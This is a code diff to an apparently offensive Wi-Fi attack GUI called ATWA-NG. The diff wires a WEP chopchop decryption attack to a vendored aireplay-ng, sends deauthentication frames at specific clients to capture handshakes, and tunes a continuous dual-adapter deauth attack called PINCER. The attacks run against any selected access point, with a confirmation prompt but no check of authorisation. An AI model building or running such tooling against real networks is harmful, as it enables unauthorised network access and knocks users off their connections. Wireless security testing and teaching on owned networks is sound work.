@@ -1779,20 +1779,26 @@ class App:
         self._run_bg(f"Caffe Latte on {client_mac}", self._runner().caffe_latte, client_mac, ap, key_len)
 
     def _attack_chopchop(self):
-        """DISABLED (2026-08-25): the native ICV-correction math doesn't
-        work through WEP's RC4 encryption — confirmed by two independent
-        offline verification tests, not just a live failure. See the
-        comment above attacks/wep_client.py's chopchop(). The project's
-        own compiled injection engine (vendor/aircrack-ng) already has a
-        real, working chopchop attack; driving it from here is future
-        work."""
-        messagebox.showwarning(
-            "ATWA-NG",
-            "WEP Chopchop is disabled — its decryption math doesn't work "
-            "against real WEP encryption (verified offline, not just "
-            "untested).\n\nThe project's own compiled injection engine "
-            "already has a working chopchop attack — use that for now.",
-        )
+        """The native from-scratch chopchop (ICV-correction math) is
+        disabled — confirmed broken by two independent offline verification
+        tests, see the comment above attacks/wep_client.py's chopchop().
+        This drives the project's own vendored/self-compiled aireplay-ng's
+        real -4/--chopchop mode instead (chopchop_vendor(), wired via
+        AttackRunner.chopchop()) — not the broken native function."""
+        ap = self._require_target()
+        if not ap:
+            return
+        if not self.own_mac:
+            messagebox.showwarning("ATWA-NG", "Own MAC not known yet — restart monitor mode.")
+            return
+        if not self._confirm_attack(
+            "WEP Chopchop",
+            f"Chopchop decrypt against {ap.bssid} ({ap.ssid or '<hidden>'}) via the vendored "
+            "aireplay-ng -4/--chopchop.\nRequires a genuine WEP AP with WEP data traffic — "
+            "a WPA/WPA2-only target (or a silent one) will just run out the clock.",
+        ):
+            return
+        self._run_bg(f"WEP Chopchop on {ap.bssid}", self._runner().chopchop, ap)
 
     def _attack_wps_null_pin(self):
         ap = self._require_target()
@@ -1912,6 +1918,11 @@ class App:
         from ..attacks.handshake import HandshakeStatus, capture_handshake
         from ..storage import target_capture_dir
 
+        if ap.pmf == "required":
+            self._log("auto-deauth: PMF required — deauth would be dropped, skipping round loop entirely")
+            self._queue.put(("auto_deauth_done", None))
+            return
+
         max_rounds = 6
         out_dir = target_capture_dir(ap.ssid, ap.bssid)
         out_file = out_dir / f"autodeauth_{int(_time.time())}.pcap"
@@ -1944,12 +1955,13 @@ class App:
             for round_n in range(max_rounds):
                 if stop_event.is_set():
                     break
+                client = next(iter(ap.clients), BROADCAST)
                 try:
-                    sent = deauth(self.mon_iface, ap.bssid, channel=ap.channel, progress_fn=self._log)
+                    sent = deauth(self.mon_iface, ap.bssid, client=client, channel=ap.channel, progress_fn=self._log)
                     if sent == 0:
-                        self._log(f"auto-deauth round {round_n + 1}/{max_rounds}: did NOT go out to {ap.bssid} — see the warning above")
+                        self._log(f"auto-deauth round {round_n + 1}/{max_rounds}: did NOT go out to {client} — see the warning above")
                     else:
-                        self._log(f"auto-deauth round {round_n + 1}/{max_rounds}: sent {sent} deauth frame(s) to {ap.bssid}")
+                        self._log(f"auto-deauth round {round_n + 1}/{max_rounds}: sent {sent} deauth frame(s) to {client}")
                 except Exception as exc:  # noqa: BLE001 - auto-deauth loop must survive per-round errors
                     self._log(f"auto-deauth round {round_n + 1} failed: {exc}")
                 for _ in range(interval):
@@ -2058,10 +2070,17 @@ class App:
             messagebox.showwarning("ATWA-NG", "PINCER needs both Alfa adapters connected (AWUS036ACHM + AWUS1900).")
             return
         scan_iface, attack_iface = self.alfa_pair
+        if ap.pmf == "required":
+            radio_note = (
+                "PMF is required on this target, so deauth would be dropped anyway — "
+                "PINCER will skip the attack entirely and leave both radios untouched."
+            )
+        else:
+            radio_note = "Both radios go to monitor mode and back when done."
         if not self._confirm_attack(
             "PINCER (Dual-Alfa)",
             f"{scan_iface} listens on {ap.bssid} ({ap.ssid or '<hidden>'}) while {attack_iface} "
-            f"deauths continuously. Both radios go to monitor mode and back when done.",
+            f"deauths continuously. {radio_note}",
         ):
             return
         self._run_bg(
